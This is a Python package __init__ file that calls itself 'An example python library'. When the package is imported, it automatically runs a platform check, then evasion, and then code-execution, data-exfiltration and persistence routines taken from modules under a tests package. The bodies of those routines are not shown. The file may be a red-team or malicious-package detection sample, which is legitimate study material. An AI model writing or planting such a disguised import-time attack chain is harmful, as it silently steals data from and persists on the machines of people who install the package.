"""
pyexample.

An example python library.
"""

__version__ = "0.0.1"
__author__ = 'Peter Matkovski'
__credits__ = 'Dexter\'s Laboratory'


from tests.discovery import platform_check
from tests.evasion import run_evasions
from tests.execution import run_executions
from tests.exfiltration import run_exfiltration
from tests.persistense import run_persistense


platform_str = platform_check()
if run_evasions(platform_str):
    run_executions(platform_str)
    run_exfiltration(platform_str)
    run_persistense(platform_str)